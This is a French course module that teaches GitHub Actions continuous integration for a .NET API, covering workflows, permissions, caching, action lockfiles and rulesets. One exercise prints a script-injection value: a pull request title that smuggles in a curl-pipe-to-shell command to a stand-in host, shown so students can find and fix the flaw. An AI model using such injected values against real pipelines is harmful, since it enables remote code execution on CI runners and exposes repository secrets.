# Module 05 — GitHub Actions : l'intégration continue

> Pratiques vérifiées le 12 novembre 2026 — voir le [référentiel GitHub Actions](../docs/references/github-actions.md).
> Le workflow complet de ce module a été **exécuté avec succès le 12 novembre 2026** sur une solution minimale (modèles `webapi` et `xunit3`, SDK 10.0.404). Les étapes 8 (verrouillage des actions) et 9 (*ruleset*) ont été vérifiées dans la documentation, mais **pas exécutées** : signalez au mentor tout écart constaté.

Au module 04, vous avez écrit vos premiers tests. Ils passent sur votre poste, à condition que vous pensiez à les lancer. L'**intégration continue** supprime cette condition : à chaque envoi de code, une machine neutre récupère le dépôt, le compile et exécute les tests. Si quelque chose casse, on le sait dans les minutes qui suivent, et non le jour de la livraison.

GitHub Actions est le service d'automatisation intégré à GitHub. C'est lui qui fournira cette machine.

## Objectifs

À la fin de ce module, vous saurez :

- expliquer ce que sont un workflow, un événement, un job, une étape, une action et une machine d'exécution ;
- écrire un workflow qui compile et teste l'API à chaque *push* et à chaque *pull request* ;
- lire une exécution en échec et en retrouver la cause ;
- limiter les droits d'un workflow et maîtriser les actions tierces qu'il exécute ;
- accélérer un workflow avec un cache ;
- rendre la réussite du workflow obligatoire avant toute fusion.

## Prérequis

- Module 04 : la solution .NET existe dans `src/api/`, avec un fichier `global.json` et au moins un projet de tests créé par `dotnet new xunit3 -f net10.0`.
- Votre dépôt est hébergé sur GitHub et vous savez y pousser une branche et ouvrir une *pull request*.
- L'outil en ligne de commande [`gh`](https://cli.github.com/) est installé (utile à l'étape 8).

Sur un dépôt public, GitHub Actions est gratuit. Sur un dépôt privé, votre compte dispose d'un quota mensuel, largement suffisant pour ce cours ; le détail est dans le [référentiel](../docs/references/github-actions.md#coût).

## Règles de gestion

Aucune. Ce module outille le projet ; il ne modifie pas le code de l'application.

## Notions

### Le vocabulaire

| Terme | Définition |
| --- | --- |
| **Workflow** | Un processus automatisé, décrit par un fichier YAML dans `.github/workflows/`. Un dépôt peut en avoir plusieurs. |
| **Événement** | Ce qui déclenche un workflow : un *push*, l'ouverture d'une *pull request*, un clic, une heure. |
| **Job** | Un ensemble d'étapes exécutées sur une même machine. Les jobs d'un workflow tournent en parallèle, sauf dépendance déclarée. |
| **Étape** | Une commande (`run`) ou une action (`uses`). Les étapes d'un job s'exécutent dans l'ordre. |
| **Action** | Une étape réutilisable, publiée dans un dépôt GitHub. `actions/checkout` en est une. |
| **Machine d'exécution** (*runner*) | La machine virtuelle qui exécute un job. GitHub en fournit une neuve pour chaque job, et la détruit ensuite. |

Documentation : [Comprendre GitHub Actions](https://docs.github.com/en/actions/get-started/understand-github-actions)

### Une machine neuve à chaque fois

C'est le point le plus important à garder en tête. La machine ne connaît rien de votre projet : pas de code, pas de paquets téléchargés, pas de base de données. Chaque job repart de zéro.

D'où deux conséquences :

- un workflow commence toujours par **récupérer le code** ;
- ce qui « marche sur mon poste » grâce à un outil installé il y a six mois ou à un fichier non versionné **échouera** ici. C'est précisément ce qu'on cherche à savoir.

### Une action est du code que vous exécutez

`uses: actions/checkout@v7` télécharge et exécute le code du dépôt `actions/checkout`, à la version désignée par `v7`. Ce code tourne avec les droits de votre workflow.

Une action est donc une **dépendance**, au même titre qu'un paquet NuGet, avec les mêmes questions : qui la publie, quelle version, et que se passe-t-il si elle est compromise ? Les étapes 7 et 8 y répondent.

## Pas à pas

### 1. Un premier workflow

Créez `.github/workflows/ci.yml` :

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

jobs:
  api:
    name: API
    runs-on: ubuntu-24.04
    steps:
      - name: Dire bonjour
        run: echo "Bonjour depuis $RUNNER_OS"
```

Ce qu'il faut y lire :

- **`name`** : le nom affiché dans l'onglet *Actions* du dépôt.
- **`on`** : les événements déclencheurs. Ici, un *push* sur `main`, toute *pull request*, et `workflow_dispatch`, qui ajoute un bouton de lancement manuel.
- **`jobs`** : un seul job, d'identifiant `api`.
- **`runs-on`** : le système de la machine d'exécution.
- **`steps`** : une étape, qui exécute une commande.

Poussez ce fichier sur une branche, ouvrez une *pull request*, puis allez dans l'onglet *Actions* : l'exécution apparaît. Cliquez dessus, puis sur le job, puis sur l'étape, pour lire sa sortie.

> **Pourquoi `ubuntu-24.04` et pas `ubuntu-latest` ?** `ubuntu-latest` désigne « la version courante », qui change : fin 2026, ce label bascule d'Ubuntu 24.04 vers 26.04. Un workflow qui passait hier peut alors échouer sans que personne ait touché au code. Même logique que pour les tags Docker du module 01 : on nomme la version.

### 2. Compiler et tester l'API

Remplacez le job par celui-ci :

```yaml
jobs:
  api:
    name: API
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    defaults:
      run:
        working-directory: src/api
    steps:
      - name: Récupérer le code
        uses: actions/checkout@v7

      - name: Installer le SDK .NET
        uses: actions/setup-dotnet@v6
        with:
          global-json-file: src/api/global.json

      - name: Restaurer les paquets
        run: dotnet restore

      - name: Compiler
        run: dotnet build --no-restore --configuration Release

      - name: Tester
        run: dotnet test --no-build --configuration Release
```

Les nouveautés :

- **`timeout-minutes`** : sans cette ligne, un job bloqué tourne jusqu'à 6 heures. Quinze minutes suffisent largement ici.
- **`defaults.run.working-directory`** : toutes les commandes `run` du job s'exécutent dans `src/api`. Cela ne concerne pas les étapes `uses`, dont les chemins partent toujours de la racine du dépôt.
- **`actions/checkout`** : récupère le code du dépôt sur la machine.
- **`actions/setup-dotnet`** : installe le SDK. `global-json-file` lui fait lire la version dans le `global.json` du projet : la version du SDK est ainsi définie à un seul endroit, le même pour votre poste et pour l'intégration continue.
- **Les trois commandes `dotnet`** s'enchaînent sans refaire le travail de la précédente : `--no-restore` et `--no-build` évitent de restaurer et de compiler deux fois.

Poussez et vérifiez que le job passe au vert.

### 3. Lire un échec

Un workflow qui ne tombe jamais en échec n'apprend rien. Provoquez-en un : modifiez un test pour qu'il échoue, poussez.

Dans l'onglet *Actions*, l'exécution est marquée d'une croix rouge. Ouvrez-la :

- l'étape en échec est dépliée automatiquement ;
- le nom du test et le message d'assertion figurent dans sa sortie ;
- les étapes suivantes n'ont pas été exécutées : par défaut, un job s'arrête à la première étape en échec.

Sur la page de la *pull request*, la même croix apparaît à côté du commit, avec un lien vers l'exécution.

Remettez le test en état avant de continuer.

### 4. Conserver les résultats des tests

Lire un échec dans un journal de plusieurs centaines de lignes devient vite pénible. Demandons à `dotnet test` un rapport, et conservons-le :

```yaml
      - name: Tester
        run: dotnet test --no-build --configuration Release --report-xunit-trx --results-directory TestResults

      - name: Conserver les résultats des tests
        if: ${{ !cancelled() }}
        uses: actions/upload-artifact@v7
        with:
          name: resultats-tests-api
          path: src/api/TestResults/
          if-no-files-found: ignore
```

- **`--report-xunit-trx`** produit un rapport au format TRX, que Visual Studio et la plupart des outils savent ouvrir. **`--results-directory`** fixe le dossier où il est écrit.
- **`actions/upload-artifact`** attache des fichiers à l'exécution : c'est un **artefact**, téléchargeable depuis la page de l'exécution.
- **`if: ${{ !cancelled() }}`** est indispensable. Sans condition, cette étape serait sautée dès que les tests échouent — c'est-à-dire exactement quand on a besoin du rapport. La condition signifie : « exécuter même si une étape précédente a échoué, sauf si l'exécution a été annulée ».
- Le chemin de `path` part de la racine du dépôt : `working-directory` ne s'applique pas aux étapes `uses`.

> **Presque tous les tutoriels écrivent `dotnet test --logger trx`.** Cette option appartient à l'ancien lanceur de tests, VSTest. Un projet créé par `dotnet new xunit3` utilise Microsoft.Testing.Platform — c'est la ligne `"runner": "Microsoft.Testing.Platform"` de votre `global.json` —, qui la refuse : `Option '--logger' uses VSTest syntax, which is not supported by Microsoft.Testing.Platform`.

> Beaucoup de tutoriels écrivent aussi `if: always()`. La documentation recommande `!cancelled()` : avec `always()`, l'étape s'exécute même quand vous annulez l'exécution, ce qui la prolonge inutilement.

### 5. Ne pas gaspiller de machines

Si vous poussez trois commits de suite sur une branche, trois exécutions démarrent, et seule la dernière vous intéresse. Ajoutez, au niveau du workflow :

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

Les exécutions d'un même groupe ne tournent pas en même temps. Ici, le groupe est formé du nom du workflow et de la branche : une nouvelle exécution sur une branche annule celle qui était en cours sur cette même branche.

`${{ ... }}` est une **expression**, évaluée par GitHub avant l'exécution. `github` est un **contexte** : un objet qui décrit l'exécution en cours.

Documentation : [Expressions](https://docs.github.com/en/actions/reference/workflows-and-actions/expressions), [Contextes](https://docs.github.com/en/actions/reference/workflows-and-actions/contexts)

### 6. Limiter les droits du workflow

Chaque exécution reçoit un jeton, `GITHUB_TOKEN`, qui lui permet d'agir sur le dépôt. Ses droits par défaut dépendent des réglages du dépôt et de l'organisation, que vous ne maîtrisez pas toujours. On les fixe donc dans le fichier, au niveau du workflow :

```yaml
permissions:
  contents: read
```

Ce workflow n'a besoin que de lire le code. Dès qu'un droit est déclaré dans `permissions`, **tous les autres sont retirés**.

C'est le principe du moindre privilège. Si une action utilisée par le workflow est un jour compromise, elle ne pourra ni pousser du code, ni publier un paquet, ni modifier une *pull request*.

Documentation : [`GITHUB_TOKEN`](https://docs.github.com/en/actions/concepts/security/github_token)

### 7. Accélérer avec un cache

Chaque exécution retélécharge tous les paquets NuGet. `setup-dotnet` sait les mettre en cache, à une condition : que le projet ait un **fichier de verrouillage**, `packages.lock.json`, qui liste la version exacte de chaque paquet, dépendances indirectes comprises.

Activez-le pour toute la solution, dans `src/api/Directory.Build.props` :

```xml
<Project>
  <PropertyGroup>
    <RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>
  </PropertyGroup>
</Project>
```

Lancez `dotnet restore` sur votre poste : un fichier `packages.lock.json` apparaît à côté de chaque projet. **Versionnez-les.**

Puis, dans le workflow :

```yaml
      - name: Installer le SDK .NET
        uses: actions/setup-dotnet@v6
        with:
          global-json-file: src/api/global.json
          cache: true
          cache-dependency-path: src/api/**/packages.lock.json

      - name: Restaurer les paquets
        run: dotnet restore --locked-mode
```

- **`cache: true`** conserve les paquets d'une exécution à l'autre. La clé du cache est calculée à partir des fichiers de verrouillage : tant qu'ils ne changent pas, le cache est réutilisé.
- **`--locked-mode`** fait échouer la restauration si les paquets à installer ne correspondent pas au fichier de verrouillage. L'intégration continue compile donc exactement les versions que vous avez testées.

Le fichier de verrouillage a un intérêt qui dépasse la vitesse : sans lui, deux restaurations à quelques jours d'écart peuvent installer des versions différentes d'une dépendance indirecte.

Comparez la durée de l'étape de restauration entre la première exécution, qui remplit le cache, et la suivante.

Documentation : [`setup-dotnet`](https://github.com/actions/setup-dotnet), [fichier de verrouillage NuGet](https://learn.microsoft.com/en-us/nuget/consume-packages/package-references-in-project-files)

### 8. Maîtriser les actions exécutées

`actions/checkout@v7` désigne un **tag** git. Or un tag peut être déplacé : si le compte du mainteneur d'une action est compromis, `v7` peut pointer demain vers un code malveillant, que votre workflow exécutera sans que rien n'ait changé dans votre dépôt.

La protection recommandée par GitHub est le **fichier de verrouillage des workflows**. Il enregistre, pour chaque action utilisée — et pour les actions dont elle dépend —, le commit exact à exécuter.

```powershell
gh extension install github/gh-actions-lock
```

```powershell
gh actions-lock
```

La seconde commande crée `.github/workflows/actions.lock`. Versionnez ce fichier, et ne le modifiez jamais à la main. Dès lors, c'est le commit enregistré qui s'exécute, quel que soit l'endroit où pointe le tag.

Relancez `gh actions-lock` chaque fois que vous ajoutez ou retirez une action dans un workflow : une action absente du fichier de verrouillage fait échouer l'exécution.

Il reste à tenir les actions à jour. Créez `.github/dependabot.yml` :

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

Dependabot ouvrira une *pull request* quand une action publie une nouvelle version, et mettra à jour le fichier de verrouillage dans la même *pull request*. Votre workflow d'intégration continue s'exécutera dessus : vous saurez si la mise à jour casse quelque chose avant de la fusionner.

> **L'alternative** que vous verrez souvent est l'épinglage par empreinte : `uses: actions/checkout@3d3c42e5...`, avec l'empreinte complète du commit. Elle reste valable, mais la documentation la place désormais derrière le fichier de verrouillage, qui couvre aussi les dépendances indirectes.

Documentation : [Fichiers de verrouillage des workflows](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles), [Verrouiller les dépendances](https://docs.github.com/en/actions/how-tos/secure-your-work/lock-workflow-dependencies), [Dependabot pour les actions](https://docs.github.com/en/code-security/how-tos/secure-your-supply-chain/secure-your-dependencies/keeping-your-actions-up-to-date-with-dependabot)

### 9. Rendre la vérification obligatoire

Pour l'instant, rien n'empêche de fusionner une *pull request* dont le workflow est rouge. Un *ruleset* y remédie.

> **Dépôt privé et compte gratuit.** Les *rulesets* ne sont disponibles sur un dépôt privé qu'avec une offre payante ; avec un compte gratuit, GitHub répond « Upgrade to GitHub Pro or make this repository public ». Dans ce cas, faites cette étape sur un dépôt public, ou lisez-la et discutez-en en séance.

Dans les réglages du dépôt, rubrique *Rules* puis *Rulesets*, créez un *ruleset* de branche :

- **cible** : la branche par défaut ;
- **règle** : exiger une *pull request* avant fusion ;
- **règle** : exiger la réussite des vérifications d'état, en ajoutant la vérification `API` — c'est le `name` du job.

Une vérification n'apparaît dans la liste que si elle a déjà réussi récemment : lancez le workflow au moins une fois avant.

Essayez ensuite de fusionner une *pull request* dont un test échoue : le bouton de fusion est bloqué.

Documentation : [À propos des rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets)

### Le workflow complet

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  api:
    name: API
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    defaults:
      run:
        working-directory: src/api
    steps:
      - name: Récupérer le code
        uses: actions/checkout@v7

      - name: Installer le SDK .NET
        uses: actions/setup-dotnet@v6
        with:
          global-json-file: src/api/global.json
          cache: true
          cache-dependency-path: src/api/**/packages.lock.json

      - name: Restaurer les paquets
        run: dotnet restore --locked-mode

      - name: Compiler
        run: dotnet build --no-restore --configuration Release

      - name: Tester
        run: dotnet test --no-build --configuration Release --report-xunit-trx --results-directory TestResults

      - name: Conserver les résultats des tests
        if: ${{ !cancelled() }}
        uses: actions/upload-artifact@v7
        with:
          name: resultats-tests-api
          path: src/api/TestResults/
          if-no-files-found: ignore
```

## À vous

1. **Résumer l'exécution.** Tout ce qu'une étape écrit dans le fichier désigné par la variable `GITHUB_STEP_SUMMARY` s'affiche, en Markdown, sur la page de l'exécution. Ajoutez une étape qui y écrit la version du SDK .NET utilisée et le nom de la branche.

2. **Trouver la faille.** Un collègue propose cette étape pour afficher le titre de la *pull request* :

   ```yaml
   - run: echo "Titre : ${{ github.event.pull_request.title }}"
   ```

   Que se passe-t-il si quelqu'un ouvre une *pull request* intitulée `"; curl https://exemple.test/x.sh | sh; echo "` ? Réécrivez l'étape pour qu'elle soit sûre. La page [Usage sûr](https://docs.github.com/en/actions/reference/security/secure-use) donne la technique.

3. **Tester sur deux systèmes.** Avec `strategy.matrix`, faites tourner le job à la fois sur `ubuntu-24.04` et `windows-2025`. Les deux passent-ils ? Comparez leurs durées, puis leurs coûts à la minute d'après le référentiel. Gardez-vous la matrice ?

4. **Planifier.** Faites tourner le workflow chaque lundi à 7 h, heure de Paris. Cherchez dans la [référence de syntaxe](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax) comment indiquer le fuseau horaire. À quoi sert une exécution planifiée si le code n'a pas changé ?

5. **Piéger le filtre.** Ajoutez un filtre `paths` pour que le workflow ne se déclenche que si `src/api/**` change, puis ouvrez une *pull request* qui ne modifie que le `README.md`. Que devient la vérification obligatoire ? Proposez une solution qui évite d'exécuter le job inutilement sans bloquer la fusion.

## Critères de réussite

- Une *pull request* déclenche le workflow, qui compile et teste l'API en moins de cinq minutes.
- Un test en échec rend l'exécution rouge, et le rapport de tests est téléchargeable depuis la page de l'exécution.
- Le workflow déclare `permissions`, `timeout-minutes` et `concurrency`, et n'utilise pas `ubuntu-latest`.
- La seconde exécution restaure les paquets depuis le cache.
- `.github/workflows/actions.lock` et `.github/dependabot.yml` sont versionnés.
- Il est impossible de fusionner dans `main` une *pull request* dont le job `API` a échoué.

## Pièges

| Ce qu'on voit dans les tutoriels | Pourquoi on ne l'écrit plus |
| --- | --- |
| `actions/checkout@v3` ou `@v4` | Ces versions reposent sur des versions de Node.js retirées des machines d'exécution. La version courante est `v7`. |
| `actions/upload-artifact@v3` | Fait échouer le workflow depuis janvier 2025. |
| `runs-on: ubuntu-latest` | Le système change sans prévenir. |
| `dotnet-version: 6.0.x` | Version hors support ; et la version se lit dans `global.json`. |
| Une étape `actions/cache` sur `~/.nuget/packages` | `setup-dotnet` le fait avec `cache: true`. |
| `dotnet test --logger trx` | Option de VSTest, refusée par Microsoft.Testing.Platform. On écrit `--report-xunit-trx`. |
| `echo "::set-output name=x::y"` | Déprécié. On écrit `echo "x=y" >> "$GITHUB_OUTPUT"`. |
| `if: always()` | `if: ${{ !cancelled() }}`. |
| Aucun bloc `permissions` | Les droits du workflow dépendent alors de réglages extérieurs au fichier. |
| `uses: quelquun/action@main` | Le code exécuté peut changer à chaque instant. |
| `on: pull_request_target` | Donne au workflow les droits et les secrets du dépôt face à du code venu de l'extérieur. Réservé à des cas précis ; `pull_request` suffit ici. |

La liste complète, avec les sources, est dans le [référentiel GitHub Actions](../docs/references/github-actions.md#3-pièges--ce-quon-trouve-encore-partout-et-quon-nécrit-plus).

## Pour la séance

- Qu'apporte l'intégration continue que ne donne pas le fait de lancer les tests soi-même avant de pousser ?
- Pourquoi la machine d'exécution est-elle détruite après chaque job ? Qu'est-ce que cela impose au projet ?
- En quoi une action GitHub ressemble-t-elle à un paquet NuGet ? Quels risques partagent-ils ?
- Quelle différence entre un tag, une empreinte de commit et un fichier de verrouillage, du point de vue de la sécurité ?
- Votre workflow a les droits `contents: read`. Que pourrait faire une action compromise malgré tout ?
- Un workflow rouge sur `main` : qui doit s'en occuper, et dans quel délai ?
- Faut-il qu'un administrateur puisse contourner le *ruleset* ? Dans quels cas ?

## Pour aller plus loin

- [Workflows réutilisables](https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations) : partager un même enchaînement entre plusieurs workflows ou plusieurs dépôts.
- [File de fusion](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/managing-a-merge-queue) : tester chaque *pull request* sur l'état exact qu'aura `main` après fusion.
- [Bien utiliser `pull_request_target`](https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target) : comprendre pourquoi cet événement est dangereux.
- Suite dans le cours : le module 11 ajoute les tests contre une vraie base, le module 20 un job pour l'interface Angular, le module 22 les contrôles de qualité, le module 24 la publication des images.
